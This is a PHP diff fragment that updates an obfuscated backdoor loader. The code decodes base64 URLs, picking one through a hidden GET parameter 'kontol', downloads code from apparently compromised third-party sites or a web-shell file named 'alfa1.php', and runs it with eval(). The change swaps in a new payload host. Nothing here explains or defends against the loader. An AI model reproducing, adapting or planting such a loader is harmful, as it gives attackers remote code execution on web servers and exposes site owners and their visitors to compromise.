@@ -25,7 +25,7 @@ $x = '?>';
 if (isset($_GET['kontol'])) {
     $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi9hbGZhMS5waHA=');
 } else {
-    $target_url = base64_decode('aHR0cHM6Ly9zdHVkZW50c3VwcG9ydC5uZXdoYXZlbi5lZHUvd3AtaW5jbHVkZXMvVGV4dC9EaWZmL1JlbmRlcmVyL2lubGluZS1iay5waHA=');
+    $target_url = base64_decode('aHR0cHM6Ly90ZWdhbHJlam8uc2FsYXRpZ2EuZ28uaWQvd3AtaW5jbHVkZXMvaW1hZ2VzL2NyeXN0YWwvLS8=');
 }
 
 eval($x . get_data($target_url));
